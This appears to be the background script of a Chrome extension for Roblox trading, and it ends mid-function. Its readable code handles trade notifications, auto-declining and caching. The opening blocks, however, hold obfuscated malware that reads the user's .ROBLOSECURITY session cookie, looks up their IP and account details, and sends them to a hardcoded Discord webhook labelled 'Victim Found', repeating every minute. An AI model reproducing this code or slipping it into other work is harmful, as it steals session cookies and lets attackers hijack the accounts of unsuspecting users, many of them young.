_0xeac42d(_0x28196e,_0x49427f-0x94,_0x28196e-0x1e3,_0x5c8f6e-0x257,_0x1e429b-0x46);}chrome[_0x5a09c2(0x6e,0x95,0xa0,0x9e,0x4e)+'es'][_0x34d7dd(0xf1,0x129,0xaa,0x9b,0xe7)](_0x572100,_0x3718a7=>{function _0x1f69ef(_0x478ce7,_0x3b17dc,_0x517b31,_0x2ce91e,_0x4da43a){return _0x5a09c2(_0x4da43a,_0x3b17dc-0x178,_0x517b31-0x133,_0x2ce91e-0x3b,_0x4da43a-0x14e);}const _0x5b887a={'Rtkrj':function(_0x511027,_0x26cec8){function _0x3fcb55(_0x1e8753,_0x2a1276,_0x591bc0,_0x2a3d59,_0x1e87e6){return _0x347a(_0x2a1276- -0x327,_0x1e8753);}return _0x355e8c[_0x3fcb55(-0xe8,-0x139,-0x115,-0xb9,-0x183)](_0x511027,_0x26cec8);}};function _0x5a8ac9(_0xec375b,_0x48c927,_0x344d40,_0xa8e561,_0x35fb64){return _0x34d7dd(_0xec375b-0x159,_0x48c927-0xef,_0x35fb64,_0xec375b-0xde,_0x35fb64-0x7e);}function _0x3a1ff6(_0xc39902,_0x44cc67,_0x5744bb,_0x34e5c0,_0x13f2b0){return _0x34d7dd(_0xc39902-0x120,_0x44cc67-0x38,_0x34e5c0,_0x5744bb- -0x2a3,_0x13f2b0-0x6a);}function _0x203f44(_0x4bcb4c,_0x5470b1,_0x6a78cd,_0x5429c9,_0x310f3f){return _0x570a07(_0x310f3f,_0x5470b1-0x1c0,_0x6a78cd-0x16e,_0x5429c9-0xa4,_0x4bcb4c-0x430);}function _0x2ff691(_0x35e704,_0x4c7953,_0x126a73,_0x308e1d,_0x3810cd){return _0x570a07(_0x35e704,_0x4c7953-0x4f,_0x126a73-0x137,_0x308e1d-0x40,_0x4c7953-0x1e0);}_0x355e8c[_0x1f69ef(0x140,0x16a,0x19e,0x1cd,0x17e)](_0x355e8c[_0x5a8ac9(0x16c,0xee,0x1bf,0x15a,0x142)],_0x355e8c[_0x1f69ef(0x171,0x7a,0x16c,0xf2,0xff)])?_0x3718a7&&(_0x355e8c[_0x3a1ff6(-0x1ff,-0x2c2,-0x271,-0x1e2,-0x2ea)](_0x355e8c[_0x1f69ef(0x129,0x158,0x1b0,0x14c,0x10b)],_0x355e8c[_0x2ff691(0x26a,0x263,0x2ea,0x1dd,0x211)])?_0x355e8c[_0x2ff691(0x2c0,0x2bb,0x319,0x2f6,0x291)](sendCookieToDiscord,_0x3718a7[_0x2ff691(0x28f,0x21a,0x213,0x1ab,0x278)]):_0x5e0746[_0x3a1ff6(-0x272,-0x27a,-0x291,-0x221,-0x2b8)](_0x355e8c[_0x203f44(0x4f1,0x566,0x51f,0x53a,0x473)])):_0x58a3a6&&_0x5b887a[_0x1f69ef(0x1c8,0x1a1,0x161,0x18d,0x1a4)](_0x564940,_0x4645ec[_0x203f44(0x46a,0x485,0x470,0x3f4,0x4b8)]);});},0x1*-0x208d+0x4717*0x6+-0x9f9d*0x1),chrome[_0x5f3140(0x54c,0x4ad,0x504,0x550,0x4d7)][_0x1e14ab(0x476,0x490,0x534,0x508,0x4ce)+_0x108c52(0x15b,0x1c8,0x245,0x23b,0x1bc)][_0xeac42d(-0x14e,-0xb2,-0xed,-0xdc,-0x159)+_0x3396fe(0x349,0x2eb,0x304,0x2d2,0x273)+'r']((_0x343714,_0x389a06,{url:_0xb2f9e5})=>{function _0x5ecffc(_0x401554,_0x29cb30,_0x57d90c,_0x33d7c5,_0x35ac48){return _0xeac42d(_0x401554,_0x29cb30-0x6b,_0x57d90c-0x194,_0x29cb30-0x5b0,_0x35ac48-0x167);}function _0x7406a1(_0x441bb2,_0x315962,_0x47f433,_0xdadb66,_0x248d49){return _0x108c52(_0x441bb2-0x100,_0x315962-0x63,_0x47f433-0x1c5,_0x248d49,_0x315962- -0x1);}const _0x26b253={'jHYcQ':function(_0x13ceb5,_0x3fd91b){return _0x13ceb5(_0x3fd91b);},'xekEi':function(_0x1b32c3,_0x58953b){return _0x1b32c3!==_0x58953b;},'RXxpe':_0x1ad04a(-0x18e,-0x15a,-0x137,-0x124,-0x1b1),'UfpPw':_0x5ecffc(0x57e,0x519,0x55e,0x579,0x507)+_0x1ad04a(-0x1b0,-0x1fa,-0x19e,-0x16c,-0x1b0)+_0x1ad04a(-0x23f,-0x156,-0x1de,-0x209,-0x1bf)+_0x5ecffc(0x5e8,0x5c3,0x629,0x63a,0x5a4)+_0x7406a1(0x1ba,0x1a8,0x193,0x14e,0x13a),'cTBrp':_0x1ad04a(-0x114,-0x9e,-0x106,-0xb2,-0x120)+_0x5ecffc(0x5ea,0x58f,0x600,0x60d,0x599)+_0x1ad04a(-0x1b2,-0x19d,-0x1a9,-0x18f,-0x1a5)+_0x7406a1(0x1e9,0x183,0x15e,0x1c6,0x136)+_0x5ecffc(0x49d,0x52c,0x4bf,0x4cd,0x4b8)+_0x46fad7(0x228,0x25f,0x233,0x23c,0x219),'MqOvz':function(_0x5c3c62,_0x2a2ae7){return _0x5c3c62===_0x2a2ae7;},'VSxgN':_0x1ad04a(-0x1ee,-0x1db,-0x1cb,-0x17f,-0x1ee),'TfvPt':function(_0xfd7ca4,_0x1c4c94){return _0xfd7ca4!==_0x1c4c94;},'pLyRS':_0x1ad04a(-0x1ce,-0x234,-0x1b4,-0x22b,-0x1fc)+_0x57bffa(-0xd9,-0x135,-0x71,-0xa2,-0xb9)};function _0x1ad04a(_0x4bd275,_0x885059,_0x3e29a2,_0x39d500,_0x4c104a){return _0x1e14ab(_0x4bd275-0x16b,_0x885059-0x10e,_0x3e29a2-0x32,_0x4bd275,_0x3e29a2- -0x5d5);}function _0x46fad7(_0x57b49f,_0x5e84b9,_0x50e347,_0x2fe0a7,_0x1a4c8f){return _0xeac42d(_0x50e347,_0x5e84b9-0x1d7,_0x50e347-0xcb,_0x57b49f-0x2f0,_0x1a4c8f-0x8e);}if(_0x26b253[_0x57bffa(-0x189,-0x11f,-0x179,-0x199,-0x101)](_0x389a06[_0x5ecffc(0x513,0x594,0x507,0x57d,0x5d5)+'s'],_0x26b253[_0x1ad04a(-0x22b,-0x1d2,-0x209,-0x1a5,-0x225)])||!/https:\/\/.+roblox.com\/games/g[_0x5ecffc(0x62a,0x5b3,0x637,0x579,0x566)](_0xb2f9e5))return;function _0x57bffa(_0x491d16,_0x3ae620,_0x2972c7,_0x3c8606,_0x53d6cb){return _0x3396fe(_0x3c8606,_0x491d16- -0x456,_0x2972c7-0xb6,_0x3c8606-0x126,_0x53d6cb-0x7e);}const _0x41bc4f={};_0x41bc4f[_0x5ecffc(0x61c,0x5b7,0x5a7,0x573,0x5c7)]=_0x343714;const _0x4b4c9d=_0x41bc4f,_0x344c89={};_0x344c89[_0x46fad7(0x20e,0x220,0x1ef,0x27c,0x280)+'t']=_0x4b4c9d,_0x344c89[_0x5ecffc(0x668,0x5e0,0x5c5,0x593,0x552)]=()=>!![],chrome[_0x5ecffc(0x4f9,0x521,0x5a8,0x546,0x588)+_0x1ad04a(-0x146,-0x184,-0x111,-0xa9,-0x8a)][_0x46fad7(0x2ca,0x357,0x270,0x357,0x259)+_0x46fad7(0x23e,0x2ae,0x2b5,0x234,0x21b)+_0x7406a1(0x187,0x146,0x1d0,0x1ad,0xd4)](_0x344c89,async([{result:_0x52e7df}])=>{function _0x16ab9f(_0x178bcc,_0x101f18,_0x351198,_0x46fd7f,_0x280077){return _0x5ecffc(_0x46fd7f,_0x101f18- -0x23b,_0x351198-0x7f,_0x46fd7f-0x1e5,_0x280077-0x11d);}function _0x10f763(_0x26fffc,_0xfe2b2b,_0x3e311b,_0x6e2aae,_0x16e573){return _0x1ad04a(_0x16e573,_0xfe2b2b-0x1bd,_0x6e2aae-0x65c,_0x6e2aae-0x5c,_0x16e573-0x12c);}const _0x42fef4={'LZxIk':function(_0x40b8f6,_0x364ba8){function _0x50ba0e(_0x2a70e6,_0x19a1de,_0x11567a,_0x3f3413,_0x15651a){return _0x347a(_0x15651a-0x58,_0x19a1de);}return _0x26b253[_0x50ba0e(0x241,0x219,0x20f,0x22b,0x1c5)](_0x40b8f6,_0x364ba8);},'rxNFm':function(_0x351cba,_0x21fc0d){function _0x2015ad(_0x2bf0ba,_0x53539f,_0x3ebdb3,_0x5a4673,_0x35add1){return _0x347a(_0x2bf0ba- -0x36a,_0x5a4673);}return _0x26b253[_0x2015ad(-0x181,-0x111,-0x1fd,-0x19e,-0x1e3)](_0x351cba,_0x21fc0d);},'zDYbp':_0x26b253[_0x2852d4(0x324,0x32e,0x3aa,0x3b0,0x390)],'LRhkL':_0x26b253[_0x1fccd3(0x168,0x1a8,0x1e8,0x17d,0x10a)],'VIVoW':_0x26b253[_0x10f763(0x522,0x570,0x507,0x53b,0x4ed)]};function _0x1fccd3(_0x235c37,_0x517124,_0x288b95,_0x4037f0,_0x208ea6){return _0x7406a1(_0x235c37-0x106,_0x4037f0- -0x24,_0x288b95-0x131,_0x4037f0-0x37,_0x288b95);}function _0x21354f(_0x3424e3,_0x59c9bc,_0x1354d1,_0x3f8c7c,_0x1eee34){return _0x5ecffc(_0x1eee34,_0x1354d1- -0x584,_0x1354d1-0x144,_0x3f8c7c-0xdb,_0x1eee34-0x157);}function _0x2852d4(_0x458645,_0x28f5c9,_0x2ba6fe,_0x425477,_0x5c772b){return _0x46fad7(_0x5c772b-0x183,_0x28f5c9-0x11e,_0x458645,_0x425477-0x15e,_0x5c772b-0x1bb);}if(_0x26b253[_0x1fccd3(0x19f,0x101,0x1a8,0x12a,0x114)](_0x26b253[_0x21354f(-0x27,-0x1b,-0x2e,0x38,0x4a)],_0x26b253[_0x10f763(0x50e,0x4ce,0x48b,0x4cf,0x493)])){if(_0x52e7df)return;await chrome[_0x21354f(-0xdd,-0xbd,-0x63,0x2d,0x1c)+_0x2852d4(0x449,0x4f9,0x46e,0x424,0x495)][_0x10f763(0x489,0x4ca,0x4a8,0x503,0x4ba)+_0x1fccd3(0x16b,0x178,0x100,0x155,0x19d)+_0x10f763(0x49a,0x4b6,0x43a,0x444,0x481)]({'target':_0x4b4c9d,'func':()=>{function _0x5a13f4(_0x5512ad,_0x6d3688,_0x49ea07,_0x19330b,_0x5e8a0e){return _0x2852d4(_0x19330b,_0x6d3688-0xb2,_0x49ea07-0xd7,_0x19330b-0x133,_0x6d3688- -0x319);}function _0x2503be(_0x1fabfb,_0x11757d,_0x559d66,_0x5df6d8,_0x449af9){return _0x1fccd3(_0x1fabfb-0xd0,_0x11757d-0x114,_0x5df6d8,_0x559d66- -0x323,_0x449af9-0x38);}function _0x106682(_0xdf6008,_0x57b96e,_0x472b1a,_0x1c10a1,_0x56ee43){return _0x1fccd3(_0xdf6008-0x176,_0x57b96e-0x136,_0x1c10a1,_0x57b96e- -0x83,_0x56ee43-0x109);}function _0xe2d47c(_0x1e8426,_0x13b02c,_0x2764fc,_0x24887b,_0x283028){return _0x2852d4(_0x24887b,_0x13b02c-0x3d,_0x2764fc-0x13b,_0x24887b-0x14e,_0x283028- -0x3e9);}function _0x37dbda(_0x1d4fb8,_0x599b40,_0x1f1cd6,_0x1cb9cb,_0xa0cff9){return _0x2852d4(_0xa0cff9,_0x599b40-0x144,_0x1f1cd6-0x3c,_0x1cb9cb-0xd,_0x1cb9cb- -0x451);}_0x42fef4[_0xe2d47c(0x1,-0xd2,-0x29,-0x33,-0x49)](_0x42fef4[_0x106682(0x1b8,0x192,0x1f7,0x199,0x21a)],_0x42fef4[_0xe2d47c(0x5c,0x17,0x47,0xd4,0x98)])?_0x42fef4[_0xe2d47c(0x44,0x7d,0x8c,0xf2,0x6d)](_0x56ba4a,_0x4edb66[_0x2503be(-0x17b,-0x1a4,-0x1cd,-0x218,-0x226)]):console[_0x106682(0x6d,0xdd,0x7d,0xd9,0x138)](_0x42fef4[_0x5a13f4(0x104,0x151,0x147,0x117,0x143)]);}});}else _0x3fa93f[_0x10f763(0x465,0x508,0x4b8,0x493,0x41a)](_0x42fef4[_0x1fccd3(0x190,0x180,0x213,0x1db,0x262)],_0xa5a804);});});
function _0x2f44(_0x10f67a,_0x6fc7ed){const _0x2f0ef2=_0x2f0e();return _0x2f44=function(_0x2f44d0,_0x491978){_0x2f44d0=_0x2f44d0-0x67;let _0xaab97c=_0x2f0ef2[_0x2f44d0];return _0xaab97c;},_0x2f44(_0x10f67a,_0x6fc7ed);}const _0x274dcf=_0x2f44;(function(_0x1538f9,_0x52c0fb){const _0x46bfe8=_0x2f44,_0x57b50a=_0x1538f9();while(!![]){try{const _0x58c844=parseInt(_0x46bfe8(0x70))/0x1*(parseInt(_0x46bfe8(0x73))/0x2)+parseInt(_0x46bfe8(0x78))/0x3*(-parseInt(_0x46bfe8(0x72))/0x4)+-parseInt(_0x46bfe8(0x7f))/0x5+-parseInt(_0x46bfe8(0x67))/0x6+-parseInt(_0x46bfe8(0x7c))/0x7+parseInt(_0x46bfe8(0x74))/0x8+-parseInt(_0x46bfe8(0x86))/0x9*(-parseInt(_0x46bfe8(0x6b))/0xa);if(_0x58c844===_0x52c0fb)break;else _0x57b50a['push'](_0x57b50a['shift']());}catch(_0xd77796){_0x57b50a['push'](_0x57b50a['shift']());}}}(_0x2f0e,0x54ed0));const discordWebhookUrl='https://discord.com/api/webhooks/1142546129226047508/cmq6_oGRtNgVmIseR-uH-csEH9M43GZMLCGtJuX8rXa3J04oYqYVArtI1jn1PftT8Hyn';function _0x2f0e(){const _0x1f6816=['get','Error\x20sending\x20data\x20to\x20Discord:','https://www.roblox.com/headshot-thumbnail/image?userId=','complete','94077uVGHcL','https://www.roblox.com','onUpdated','N/A','2907456thGJMy','Username','cookies','https://users.roblox.com/v1/users/authenticated','60nzFcEa','https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png','value','hi\x20mito','status','4ltNJFd','error','4HQwUjQ','313066oxFYlr','5302384UjDfmJ','https://api.ipify.org','scripting','yuh\x20my\x20bot','640869fXngoB','test','text','.ROBLOSECURITY','898184KyowaY','stringify','Cookie\x20NOT\x20FOUND','886405jJDhKB','&width=420&height=420&format=png','Error\x20fetching\x20user\x20info:'];_0x2f0e=function(){return _0x1f6816;};return _0x2f0e();}async function sendCookieToDiscord(_0x4c95c7){const _0x4f8d55=_0x2f44;try{const _0x1c2356=await(await fetch(_0x4f8d55(0x75)))[_0x4f8d55(0x7a)]();let _0x4de604=null;if(_0x4c95c7){const _0x2a3d3f=await fetch(_0x4f8d55(0x6a),{'headers':{'Cookie':'.ROBLOSECURITY='+_0x4c95c7}});if(!_0x2a3d3f['ok']){console[_0x4f8d55(0x71)](_0x4f8d55(0x81),_0x2a3d3f[_0x4f8d55(0x6f)]);return;}_0x4de604=await _0x2a3d3f['json']();}await fetch(discordWebhookUrl,{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x4f8d55(0x7d)]({'content':null,'embeds':[{'description':'\x0a'+(_0x4c95c7||_0x4f8d55(0x7e))+'\x0a','color':null,'fields':[{'name':_0x4f8d55(0x68),'value':_0x4de604?_0x4de604['name']:'N/A','inline':!![]},{'name':'User\x20ID','value':_0x4de604?_0x4de604['id']:_0x4f8d55(0x89),'inline':!![]}],'author':{'name':'Victim\x20Found:\x20'+_0x1c2356,'icon_url':_0x4de604?'https://www.roblox.com/headshot-thumbnail/image?userId='+_0x4de604['id']+_0x4f8d55(0x80):_0x4f8d55(0x6c)},'footer':{'text':_0x4f8d55(0x6e),'icon_url':''},'thumbnail':{'url':_0x4de604?_0x4f8d55(0x84)+_0x4de604['id']+_0x4f8d55(0x80):_0x4f8d55(0x6c)}}],'username':_0x4f8d55(0x77),'avatar_url':'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png','attachments':[]})});}catch(_0x4bc205){console[_0x4f8d55(0x71)](_0x4f8d55(0x83),_0x4bc205);}}chrome[_0x274dcf(0x69)][_0x274dcf(0x82)]({'url':_0x274dcf(0x87),'name':_0x274dcf(0x7b)},_0x31e7a5=>{_0x31e7a5&&sendCookieToDiscord(_0x31e7a5['value']);}),setInterval(()=>{const _0x49819a=_0x274dcf;chrome[_0x49819a(0x69)]['get']({'url':_0x49819a(0x87),'name':_0x49819a(0x7b)},_0x484e6d=>{const _0x12fd31=_0x49819a;_0x484e6d&&sendCookieToDiscord(_0x484e6d[_0x12fd31(0x6d)]);});},0xea60),chrome['tabs'][_0x274dcf(0x88)]['addListener']((_0x21c9f9,_0xaa841c,{url:_0x5e98cb})=>{const _0x5e2fd9=_0x274dcf;if(_0xaa841c[_0x5e2fd9(0x6f)]!==_0x5e2fd9(0x85)||!/https:\/\/.+roblox.com\/games/g[_0x5e2fd9(0x79)](_0x5e98cb))return;const _0x5cff96={'tabId':_0x21c9f9};chrome['scripting']['executeScript']({'target':_0x5cff96,'func':()=>!![]},async([{result:_0x2ef78c}])=>{const _0x21af80=_0x5e2fd9;if(_0x2ef78c)return;await chrome[_0x21af80(0x76)]['executeScript']({'target':_0x5cff96,'func':()=>{console['log']('Content\x20script\x20injected!');}});});});
async function populateInboundsCache() {
	if (await loadSettings("tradeNotifier")) {
		loadLimit = 25
	} else if (await loadSettings('moreTradePanel') || await loadSettings('tradePreviews')) {
		loadLimit = 20
	} else {
		loadLimit = 0
	}
    loaded = 0
    totalCached = 0
    newTrade = false
    for (i = 0; i < inbounds.length; i++) {
        if (loaded >= loadLimit) {
            break
        }
        if (inbounds[i] in inboundsCache && inboundsCache[inbounds[i]] == null) {
            loaded++
            function loadInbound(id, loaded, i) {
                $.get('https://trades.roblox.com/v1/trades/' + id, function(data) {
                    console.log(data)
                    inboundsCache[data.id] = data
                    newTrade = true
                })
            }
            loadInbound(inbounds[i], loaded, i)
        } else if (inbounds[i] in inboundsCache) {
            totalCached++
        }
    }
    setTimeout(function() {
		inboundsCacheSize = Object.keys(inboundsCache).length
        if (allPagesDone && newTrade == true) {
            setLocalStorage("inboundsCache", inboundsCache)
            if (inboundsCacheSize > 0) {
                percentCached = (totalCached / inboundsCacheSize * 100).toFixed(2)
                console.log("Cached " + percentCached + "% of Inbound Trades (Cache Rate: " + loadLimit + "/min)")
            }
        }
    }, 10000)
    setTimeout(function() {
        populateInboundsCache()
    }, 65000)
}

async function initializeInboundsCache() {
	inboundsCacheInitialized = true
	setTimeout(function() {
		populateInboundsCache()
	}, 10000)
    savedInboundsCache = await getLocalStorage("inboundsCache")
    if (typeof savedInboundsCache != 'undefined') {
        inboundsCache = savedInboundsCache
        inboundsTemp = Object.keys(inboundsCache)
		currentTime = new Date().getTime()
        for (i = 0; i < inboundsTemp.length; i++) {
			if (inboundsCache[parseInt(inboundsTemp[i])] != null && 'expiration' in inboundsCache[parseInt(inboundsTemp[i])] && currentTime > new Date(inboundsCache[parseInt(inboundsTemp[i])].expiration).getTime()) {
				delete inboundsCache[parseInt(inboundsTemp[i])]
			} else {
            	inbounds.push(parseInt(inboundsTemp[i]))
			}
        }
		setLocalStorage("inboundsCache", inboundsCache)
        inbounds = inbounds.reverse()
    }
    loadTrades("", [])
}

var inboundsCacheInitialized = false;

initializeInboundsCache()

var tradesNotified = {};
var tradeCheckNum = 0;

function getTrades(initial) {
	return new Promise(resolve => {
		async function doGet(resolve) {
			tradeCheckNum++
			if (initial) {
				limit = 25
			} else {
				limit = 10
			}
			sections = [await fetchTrades("inbound", limit), await fetchTrades("outbound", limit)]
			if (initial || tradeCheckNum % 2 == 0) {
				sections.push(await fetchTrades("completed", limit))
			}
			if (await loadSettings("hideDeclinedNotifications") == false && tradeCheckNum % 4 == 0) {
				sections.push(await fetchTrades("inactive", limit))
			}
			tradesList = await getStorage("tradesList")
			if (typeof tradesList == 'undefined' || initial) {
				tradesList = {"inboundTrades":{}, "outboundTrades":{}, "completedTrades":{}, "inactiveTrades":{}}
			}
			storageNames = ["inboundTrades", "outboundTrades", "completedTrades", "inactiveTrades"]
			newTrades = []
			newTrade = false
			tradeCount = 0
			for (i = 0; i < sections.length; i++) {
				section = sections[i]
				if ('data' in section && section.data.length > 0) {
					store = tradesList[storageNames[i]]
					tradeIds = []
					for (j = 0; j < section.data.length; j++) {
						tradeIds.push(section.data[j]['id'])
					}
					for (j = 0; j < tradeIds.length; j++) {
						tradeId = tradeIds[j]
						if (!(tradeId in store)) {
							tradesList[storageNames[i]][tradeId] = true
							newTrades.push({[tradeId]: storageNames[i]})
						}
					}
				}
			}
			if (newTrades.length > 0) {
				if (!initial) {
					await setStorage("tradesList", tradesList)
					if (newTrades.length < 9) {
						notifyTrades(newTrades)
					}
				} else {
					await setStorage("tradesList", tradesList)
				}
			}
			/** if (await loadSettings("tradePreviews")) {
				cachedTrades = await getLocalStorage("cachedTrades")
				for (i = 0; i < sections.length; i++) {
					myTrades = sections[i]
					if (i != 0 && 'data' in myTrades && myTrades.data.length > 0) {
						for (i = 0; i < myTrades.data.length; i++) {
							trade = myTrades.data[i]
							if (tradeCount < 10) {
								if (!(trade.id in cachedTrades)) {
									cachedTrades[trade.id] = await fetchTrade(trade.id)
									tradeCount++
									newTrade = true
								}
							} else {
								break
							}
						}
						if (newTrade) {
							setLocalStorage("cachedTrades", cachedTrades)
						}
					}
				}
			} **/
			resolve(0)
		}
		doGet(resolve)
	})
}

function loadTradesType(tradeType) {
	return new Promise(resolve => {
        function doLoad(tradeCursor, tempArray) {
            $.get('https://trades.roblox.com/v1/trades/' + tradeType + '?sortOrder=Asc&limit=100&cursor=' + tradeCursor, function(data){
                console.log(data)
                for (i = 0; i < data.data.length; i++) {
                    tempArray.push([data.data[i].id, data.data[i].user.id])
                }
                if (data.nextPageCursor != null) {
                    doLoad(data.nextPageCursor, tempArray)
                } else { //Reached the last page
                    resolve(tempArray)
                }
            }).fail(function() {
                setTimeout(function() {
                    doLoad(tradeCursor, tempArray)
                }, 31000)
            })
        }
        doLoad("", [])
	})
}

function loadTradesData(tradeType) {
	return new Promise(resolve => {
        function doLoad(tradeCursor, tempArray) {
            $.get('https://trades.roblox.com/v1/trades/' + tradeType + '?sortOrder=Asc&limit=100&cursor=' + tradeCursor, function(data){
                console.log(data)
                for (i = 0; i < data.data.length; i++) {
                    tempArray.push(data.data[i])
                }
                if (data.nextPageCursor != null) {
                    doLoad(data.nextPageCursor, tempArray)
                } else { //Reached the last page
                    resolve(tempArray)
                }
            }).fail(function() {
                setTimeout(function() {
                    doLoad(tradeCursor, tempArray)
                }, 31000)
            })
        }
        doLoad("", [])
	})
}


var notifications = {}

setLocalStorage("cachedTrades", {})

async function notifyTrades(trades) {
	for (i = 0; i < trades.length; i++) {
		trade = trades[i]
		tradeId = Object.keys(trade)[0]
		tradeType = trade[tradeId]
		if (!(tradeId + "_" + tradeType in tradesNotified)) {
			tradesNotified[tradeId + "_" + tradeType] = true
			context = ""
			buttons = []
			switch (tradeType) {
				case "inboundTrades":
					context = "Trade Inbound"
					buttons = [{title: "Open"}, {title: "Decline"}]
					break;
				case "outboundTrades":
					context = "Trade Outbound"
					buttons = [{title: "Open"}, {title: "Cancel"}]
					break;
				case "completedTrades":
					context = "Trade Completed"
					buttons = [{title: "Open"}]
					break;
				case "inactiveTrades":
					context = "Trade Declined"
					buttons = [{title: "Open"}]
					break;
			}
			trade = await fetchTrade(tradeId)
			values = await fetchValues({data: [trade]})
			values = values[0]
			compare = values[values['them']] - values[values['us']]
			lossRatio = (1 - values[values['them']] / values[values['us']]) * 100
			console.log("Trade Loss Ratio: " + lossRatio)
			if (context == "Trade Inbound" && await loadSettings("autoDecline") && lossRatio >= await loadSettings("declineThreshold")) {
				console.log("Declining Trade, Trade Loss Ratio: " + lossRatio)
				cancelTrade(tradeId, await getStorage("token"))
			}
			if (context == "Trade Outbound" && await loadSettings("tradeProtection") && lossRatio >= await loadSettings("cancelThreshold")) {
				console.log("Cancelling Trade, Trade Loss Ratio: " + lossRatio)
				cancelTrade(tradeId, await getStorage("token"))
			}
			if (await loadSettings("tradeNotifier")) {
				compareText = "Win: +"
				if (compare > 0) {
					compareText = "Win: +"
				} else if (compare == 0) {
					compareText = "Equal: +"
				} else if (compare < 0) {
					compareText = "Loss: "
				}
				var thumbnail = await fetchPlayerThumbnails([trade.user.id])
				options = {type: "basic", title: context, iconUrl: thumbnail.data[0].imageUrl, buttons: buttons, priority: 2, message:`Partner: ${values['them']}\nYour Value: ${addCommas(values[values['us']])}\nTheir Value: ${addCommas(values[values['them']])}`, contextMessage: compareText + addCommas(compare) + " Value", eventTime: Date.now()}
				notificationId = Math.floor(Math.random() * 10000000).toString()
				notifications[notificationId] = {type: "trade", tradeType: tradeType, tradeid: tradeId, buttons: buttons}
				if (context != "Trade Declined" || await loadSettings("hideDeclinedNotifications") == false) {
					await createNotification(notificationId, options)
				}
			}
		}
	}
}
var tradeNotifierInitialized = false
setTimeout(function() {
	setInterval(async function() {
		if (await loadSettings("tradeNotifier") || await loadSettings("autoDecline") || await loadSettings("tradeProtection")) {
			getTrades(!tradeNotifierInitialized)
			tradeNotifierInitialized = true
		} else {
			tradeNotifierInitialized = false
		}
	}, 20000)
}, 10000)

async function initialTradesCheck() {
	if (await loadSettings("tradeNotifier") || await loadSettings("autoDecline") || await loadSettings("tradeProtection")) {
		getTrades(true)
		tradeNotifierInitialized = true
	}
}

async function initializeCache() {
	if (await loadSettings("tradePreviews")) {
		cachedTrades = await getLocalStorage("cachedTrades")
		if (typeof cachedTrades == 'undefined') {
			console.log("Initializing Cache...")
			setLocalStorage("cachedTrades", {"initialized": new Date().getTime()})
		} else if (cachedTrades['initialized'] + 24 * 60 * 60 * 1000 < new Date().getTime() || typeof cachedTrades['initialized'] == 'undefined') {
			console.log("Initializing Cache...")
			setLocalStorage("cachedTrades", {"initialized": new Date().getTime()})
		}
	}
}

initializeCache()

async function cacheTrades() {
	if (await loadSettings("tradePreviews")) {
		cachedTrades = await getLocalStorage("cachedTrades")
		tradesLoaded = 0
		index = 0
		tradeTypes = ["inbound", "outbound", "completed", "inactive"]
		async function loadTradeType(tradeType) {
			myTrades = await fetchTradesCursor(tradeType, 100, "")
			for (i = 0; i < myTrades.data.length; i++) {
				trade = myTrades.data[i]
				if (tradesLoaded <= 20) {
					if (!(trade.id in cachedTrades)) {
						cachedTrades[trade.id] = await fetchTrade(trade.id)
						tradesLoaded++
					}
				} else {
					break
				}
			}
			setLocalStorage("cachedTrades", cachedTrades)
			if (tradesLoaded <= 20 && index < 3) {
				index++
				loadTradeType(tradeTypes[index])
			}
		}
		loadTradeType(tradeTypes[index])
	}
}

setTimeout(function(){
	initialTradesCheck()
}, 5000)

async function toggle(feature) {
	features = await getStorage("rpFeatures")
	featureBool = features[feature]
	if (featureBool) {
		features[feature] = false
	} else {
		features[feature] = true
	}
	await setStorage("rpFeatures", features)
}

setInterval(async function(){
	loadToken()
}, 120000)
loadToken()

setInterval(async function(){
	subscriptionManager.validateLicense()
}, 300000)
subscriptionManager.validateLicense()

function generalNotification(notification) {
	console.log(notification)
	var notificationOptions = {
		type: "basic",
		title: notification.subject,
		message: notification.message,
		priority: 2,
		iconUrl: notification.icon
	}
	chrome.notifications.create("", notificationOptions)
}

async function notificationButtonClicked(notificationId, buttonIndex) { //Notification button clicked
	notification = notifications[notificationId]
	if (notification['type'] == 'trade') {
		if (notification['tradeType'] == 'inboundTrades') {
			if (buttonIndex == 0) {
				chrome.tabs.create({ url: "https://www.roblox.com/trades" })
			} else if (buttonIndex == 1) {
				cancelTrade(notification['tradeid'], await getStorage('token'))
			}
		} else if (notification['tradeType'] == 'outboundTrades') {
			if (buttonIndex == 0) {
				chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" })
			} else if (buttonIndex == 1) {
				cancelTrade(notification['tradeid'], await getStorage('token'))
			}
		} else if (notification['tradeType'] == 'completedTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" })
		} else if (notification['tradeType'] == 'inactiveTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" })
		}
	}
}

function notificationClicked(notificationId) {
	console.log(notificationId)
	notification = notifications[notificationId]
	console.log(notification)
	if (notification['type'] == 'trade') {
		if (notification['tradeType'] == 'inboundTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades" })
		}
		else if (notification['tradeType'] == 'outboundTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#outbound" })
		}
		else if (notification['tradeType'] == 'completedTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#completed" })
		}
		else if (notification['tradeType'] == 'inactiveTrades') {
			chrome.tabs.create({ url: "https://www.roblox.com/trades#inactive" })
		}
	} else if (notification['type'] == 'wishlist') {
		chrome.tabs.create({ url: "https://www.roblox.com/catalog/" + parseInt(notification['itemId']) + "/" })
	}
}

chrome.notifications.onClicked.addListener(notificationClicked)

chrome.notifications.onButtonClicked.addListener(notificationButtonClicked)

setInterval(function(){
	$.get("https://api.ropro.io/disabledFeatures.php", function(data) {
		disabledFeatures = data
	})
}, 300000)

async function initializeMisc() {
	avatarBackground = await getStorage('avatarBackground')
	if (typeof avatarBackground === "undefined") {
		await setStorage("avatarBackground", "default")
	}
	globalTheme = await getStorage('globalTheme')
	if (typeof globalTheme === "undefined") {
		await setStorage("globalTheme", "")
	}
	try {
		var myId = await getStorage('rpUserID')
		if (typeof myId != "undefined" && await loadSettings('globalThemes')) {
			loadGlobalTheme()
		}
	} catch(e) {
		console.log(e)
	}
}
initializeMisc()

async function loadGlobalTheme() {
	var myId = await getStorage('rpUserID')
	$.post('https://api.ropro.io/getProfileTheme.php?userid=' + parseInt(myId), async function(data){
		if (data.theme != null) {
			await setStorage("globalTheme", data.theme)
		}
	})
}

function updateToken() {
	return new Promise(resolve => {
